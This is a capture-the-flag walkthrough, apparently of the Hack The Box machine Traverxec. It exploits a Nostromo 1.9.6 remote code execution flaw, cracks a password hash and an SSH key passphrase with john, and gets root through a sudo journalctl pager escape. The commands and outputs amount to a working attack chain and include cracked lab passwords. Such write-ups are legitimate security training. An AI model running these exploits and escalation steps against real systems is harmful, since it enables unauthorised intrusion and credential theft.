# Traverxec

## Gaining Access

```
$ nmap -p- --min-rate 5000 10.129.85.183
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 10:24 EDT
Nmap scan report for 10.129.85.183
Host is up (0.0079s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### David White

Port 80 hosts a Portfolio site for a David White:

<figure><img src="../../../.gitbook/assets/image (10) (7) (1).png" alt=""><figcaption></figcaption></figure>

Here are the HTTP headers when visiting the site:

```http
HTTP/1.1 200 OK
Date: Thu, 04 May 2023 14:25:54 GMT
Server: nostromo 1.9.6
Connection: close
Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT
Content-Length: 15674
Content-Type: text/html
```

This version of Nostromo has an RCE vulnerability:

```
$ searchsploit nostromo             
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Nostromo - Directory Traversal Remote Command Execution (M | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                     | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command | linux/remote/35466.sh
----------------------------------------------------------- ---------------------------------
```

We can verify that it works by running it:

```
$ python2 47837.py 10.129.85.183 80 id


                                        _____-2019-16278
        _____  _______    ______   _____\       _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       |     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  | \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




HTTP/1.1 200 OK
Date: Thu, 04 May 2023 14:31:57 GMT
Server: nostromo 1.9.6
Connection: close


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then, we can get an easy reverse shell by using a `bash` one-liner.&#x20;

<figure><img src="../../../.gitbook/assets/image (39) (8).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Public WWW

We can't capture the user flag yet. Within the `/var/nostromo` directory, there are some `conf` folders.

```
www-data@traverxec:/var/nostromo$ ls -la
total 24
drwxr-xr-x  6 root     root   4096 Oct 25  2019 .
drwxr-xr-x 12 root     root   4096 Oct 25  2019 ..
drwxr-xr-x  2 root     daemon 4096 Oct 27  2019 conf
drwxr-xr-x  6 root     daemon 4096 Oct 25  2019 htdocs
drwxr-xr-x  2 root     daemon 4096 Oct 25  2019 icons
drwxr-xr-x  2 www-data daemon 4096 May  4 10:22 logs

www-data@traverxec:/var/nostromo/conf$ ls -la
total 20
drwxr-xr-x 2 root daemon 4096 Oct 27  2019 .
drwxr-xr-x 6 root root   4096 Oct 25  2019 ..
-rw-r--r-- 1 root bin      41 Oct 25  2019 .htpasswd
-rw-r--r-- 1 root bin    2928 Oct 25  2019 mimes
-rw-r--r-- 1 root bin     498 Oct 25  2019 nhttpd.conf
```

We can try to crack the hash within `.htpasswd`.

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash     
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (david)     
1g 0:00:00:41 DONE (2023-05-04 10:36) 0.02395g/s 253371p/s 253371c/s 253371C/s Noyoudo..Novaem
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Afterwards, we can read the configuration files.

```
# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

I searched a bit on Nostromo and this configuration, and this:

{% embed url="https://book.dragonsploit.com/web-application-testing/nostromo" %}

Basically, this allows for us to view the user's home directory by accessing `~david`. When accessed, this is what I get:

<figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

There was also a hint that a `public_www` exists in the user's directory.&#x20;

```
www-data@traverxec:/var/nostromo$ cd /home/david/public_www
www-data@traverxec:/home/david/public_www$ ls -la
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
```

Within this, there was a file that contained SSH Identity files.

```
www-data@traverxec:/home/david/public_www/protected-file-area$ ls -la
total 16
drwxr-xr-x 2 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
```

I transferred this back to my machine via `nc`, and then opened it with `tar`.&#x20;

```
$ tar zxvf backup.tgz       
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

The `id_rsa` key was password protected, but since we have a password from earlier, we can `ssh2john` > `john` it.&#x20;

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash     
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)     
1g 0:00:00:00 DONE (2023-05-04 10:42) 100.0g/s 16000p/s 16000c/s 16000C/s carolina..david
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Then, we can use `openssl` with the password to write it and SSH in.

```
$ openssl rsa -in id_rsa -out decrypted        
Enter pass phrase for id_rsa:
writing RSA key
$ chmod 600 decrypted; ssh -i decrypted david@10.129.85.183
```

### Root Shell

There are some interesting files within the user's home directory.

```
david@traverxec:~/bin$ ls -la
total 16
drwx------ 2 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-r-------- 1 david david  802 Oct 25  2019 server-stats.head
-rwx------ 1 david david  363 Oct 25  2019 server-stats.sh
```

Here's the `bash` script contents:

```bash
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

It seems that the user can execute `sudo` for `journalctl`. Based on GTFOBins, we just need to run this.&#x20;

```bash
sudo journalctl
!/bin/sh
```

However, because we don't have the credentials to run `sudo`, what we can do is execute the `sudo` command and then run `!/bin/sh`.

```
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
!/bin/sh
```

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
